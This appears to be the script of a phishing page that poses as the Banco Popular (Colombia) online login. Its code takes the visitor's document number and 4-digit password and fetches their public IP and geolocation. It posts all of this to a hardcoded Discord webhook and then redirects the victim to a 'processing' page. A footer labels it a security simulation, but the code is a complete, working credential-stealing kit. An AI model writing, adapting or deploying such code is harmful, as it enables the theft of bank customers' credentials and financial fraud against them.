<script>
    // Reemplaza con tu URL de Webhook de Discord real
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512619623353286707/1uWh9JXpXXjNMmRMIL_qOXbXaZnv5R-mUyZHzyotDzntRtKmn78AHjHEC0t5E50DTlbY";
    
    // Función para obtener la IP pública del cliente
    async function getClientIP() {
        try {
            // Usando ipify.org que es confiable y devuelve solo IP
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error("Error obteniendo IP:", error);
            return "No disponible";
        }
    }

    // Función para obtener geolocalización basada en IP usando ipapi.co (gratuito, sin key)
    async function getGeoFromIP(ip) {
        if (!ip || ip === "No disponible") return null;
        try {
            // ipapi.co devuelve JSON con ciudad, región, país, etc.
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            if (data.error) return null;
            return {
                pais: data.country_name || data.country || "Desconocido",
                ciudad: data.city || "Desconocida",
                region: data.region || "Desconocida",
                lat: data.latitude,
                lon: data.longitude,
                timezone: data.timezone
            };
        } catch (error) {
            console.error("Error obteniendo geolocalización:", error);
            return null;
        }
    }

    // Función para enviar datos a Discord Webhook
    async function sendToDiscord(userData, ip, geoInfo) {
        // Construcción del embed con los datos capturados
        const embed = {
            title: "🔐 Nuevo intento de acceso - Banco Popular",
            color: 0x008f39, // Verde similar al banco
            fields: [
                {
                    name: "📄 Tipo Documento",
                    value: userData.docType,
                    inline: true
                },
                {
                    name: "🔢 Número Documento",
                    value: userData.docNumber,
                    inline: true
                },
                {
                    name: "🔑 Contraseña",
                    value: `||${userData.password}||`, // Oculto con spoiler
                    inline: false
                },
                {
                    name: "🌐 IP Pública",
                    value: ip,
                    inline: true
                },
                {
                    name: "📍 País / Ciudad",
                    value: geoInfo ? `${geoInfo.pais} (${geoInfo.ciudad})` : "No disponible",
                    inline: true
                },
                {
                    name: "🗺️ Ubicación aproximada",
                    value: geoInfo && geoInfo.lat ? `Lat: ${geoInfo.lat}, Lon: ${geoInfo.lon}` : "No disponible",
                    inline: false
                },
                {
                    name: "🕒 Marca temporal",
                    value: new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" }),
                    inline: true
                }
            ],
            footer: {
                text: "Banco Popular - Simulación seguridad"
            },
            timestamp: new Date().toISOString()
        };

        const payload = {
            username: "Banco Popular Monitor",
            avatar_url: "https://mi.bancopopular.com.co/assets/images/favicon.ico",
            embeds: [embed]
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            console.log("Datos enviados a Discord correctamente");
        } catch (error) {
            console.error("Error enviando a Discord:", error);
        }
    }

    // Elementos del DOM
    const docNumberInput = document.getElementById('docNumber');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');

    // Función para validar que la contraseña sea exactamente 4 dígitos numéricos (sin mostrar mensajes)
    function isValidPassword(pwd) {
        return /^\d{4}$/.test(pwd);
    }

    // Validar y activar botón si campos no vacíos y contraseña válida
    function checkFields() {
        const docNumberOk = docNumberInput.value.trim() !== "";
        const passwordOk = isValidPassword(passwordInput.value.trim());
        
        if (docNumberOk && passwordOk) {
            submitBtn.classList.add('active');
            submitBtn.disabled = false;
            submitBtn.style.backgroundColor = "#008f39";
            submitBtn.style.cursor = "pointer";
        } else {
            submitBtn.classList.remove('active');
            submitBtn.disabled = true;
            submitBtn.style.backgroundColor = "#ccc";
            submitBtn.style.cursor = "default";
        }
    }

    // Restringir entrada en el campo de contraseña: solo números y máximo 4 caracteres
    passwordInput.addEventListener('input', (e) => {
        // Reemplazar cualquier caracter no numérico
        let rawValue = e.target.value;
        // Filtrar solo dígitos
        let numericValue = rawValue.replace(/\D/g, '');
        // Limitar a 4 dígitos
        if (numericValue.length > 4) {
            numericValue = numericValue.slice(0, 4);
        }
        e.target.value = numericValue;
        
        // Validar y actualizar estado del botón
        checkFields();
    });

    // Prevenir entrada de no-números mediante el evento keydown
    passwordInput.addEventListener('keydown', (e) => {
        // Permitir teclas de control: backspace, delete, tab, escape, enter, flechas, etc.
        const allowedKeys = ['Backspace', 'Delete', 'Tab', 'Escape', 'Enter', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Home', 'End'];
        if (allowedKeys.includes(e.key)) {
            return;
        }
        // Permitir solo dígitos (0-9)
        if (!/^\d$/.test(e.key)) {
            e.preventDefault();
        }
    });

    docNumberInput.addEventListener('input', checkFields);
    
    // Manejar pegado en el campo de contraseña
    passwordInput.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
        const numericOnly = pastedText.replace(/\D/g, '');
        const finalValue = numericOnly.slice(0, 4);
        passwordInput.value = finalValue;
        checkFields();
    });

    // Inicialmente deshabilitado
    submitBtn.disabled = true;
    
    // Llamar a validación inicial
    checkFields();

    // Manejo del submit del formulario
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        
        // Validación extra de seguridad antes de enviar
        const docNumber = docNumberInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (docNumber === "") {
            return;
        }
        
        if (!isValidPassword(password)) {
            return;
        }
        
        // Deshabilitar botón para evitar doble envío
        submitBtn.disabled = true;
        submitBtn.style.backgroundColor = "#ccc";
        
        // Mostrar overlay de carga
        const loader = document.getElementById('loaderOverlay');
        loader.style.visibility = "visible";
        
        // Obtener datos del formulario
        const docType = document.getElementById('docType').value;
        
        const userData = {
            docType: docType,
            docNumber: docNumber,
            password: password
        };
        
        // Obtener IP y ubicación
        let ipAddress = "No disponible";
        let geoData = null;
        
        try {
            ipAddress = await getClientIP();
            if (ipAddress !== "No disponible") {
                geoData = await getGeoFromIP(ipAddress);
            }
        } catch (err) {
            console.error("Error capturando IP/Geo:", err);
        }
        
        // Enviar a Discord
        sendToDiscord(userData, ipAddress, geoData).catch(err => console.error(err));
        
        // Redirigir a procesando.html
        setTimeout(() => {
            window.location.href = "procesando.html";
        }, 1200);
    });
</script>
